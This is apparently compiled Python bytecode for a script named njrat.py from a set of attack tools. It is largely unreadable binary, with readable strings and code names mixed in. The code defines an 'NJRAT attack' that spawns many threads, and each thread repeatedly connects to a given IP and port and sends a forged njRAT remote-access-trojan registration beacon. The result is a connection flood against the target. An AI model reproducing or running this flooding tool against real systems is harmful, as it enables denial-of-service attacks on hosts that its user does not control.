a
    g�`�  �                   @   s4   d dl Z d dlZd dlmZ dZee� dd� ZdS )�    N)�Threads�   149 ll|'|'|SGFjS2VkXzc2MTNBMTJG|'|'|SERVERPC|'|'|ser|'|'|14-05-27|'|'||'|'|Win 8.1 ProSP0 x86|'|'|No|'|'|0.7d|'|'|..|'|'|UHJvZ3JhbSBNYW5hZ2VyAA==|'|'|c                    s�   da |�d�d � t|�d�d ��td� g }� �fdd�}t| �D ]4}tdt|� d	 � t|d
�}|��  |�|� qFt	�
|� |D ]}da |��  q�td� d S )NF�:r   �   z'[1;34m[*][0m Starting NJRAT attack...c               
      s�   t rq�z"t�tjtj�} | �� �f� W n: tyb } z"t|� td� t�  W Y d }~n
d }~0 0 z| �t	� W nB ty� } z*t|� t
�d� W Y d }~q W Y d }~q d }~0 0 td� q d S )Nz1[1;31m[-][0m Failed to connect to NJRAT client!g      �?z)[1;32m[+][0m NJRAT client is connected!)�FINISH�socketZAF_INETZSOCK_STREAMZconnect�	Exception�print�exitZsendall�payload�time�sleep)Zsock�e�Z	target_ipZtarget_port� �4/storage/emulated/0/Script Vip/toolso/other/njrat.py�njrat_flood   s     
"z!NJRAT_ATTACK.<locals>.njrat_floodz[1;34m[*][0m Staring thread z...)�targetTz [1;77m[i][0m Attack completed.)r   �split�intr   �range�strr   �start�appendr   r   �join)ZthreadsZattack_timer   Zthreads_listr   �thread�tr   r   r   �NJRAT_ATTACK
   s     


r   )r   r   Z	threadingr   r
   r   r   r   r   r   r   �<module>   s
   